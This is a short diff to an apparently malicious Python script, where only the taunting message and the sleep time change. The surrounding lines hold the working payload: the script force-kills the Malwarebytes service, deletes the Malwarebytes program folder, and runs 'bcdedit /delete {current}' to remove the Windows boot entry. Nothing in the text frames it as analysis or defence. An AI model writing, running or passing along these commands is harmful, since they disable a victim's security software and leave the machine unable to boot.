@@ -1,7 +1,7 @@
 import time
 import os
-print("I warned you! wait 6 minutes now")
-time.sleep(666)
+print("I warned you! wait 5 minutes now")
+time.sleep(300)
 os.system("taskkill /f /im MBAMService.exe")
 os.system("del /s /q /f C:\Program Files\Malwarebytes")
 os.system("bcdedit /delete {current}")
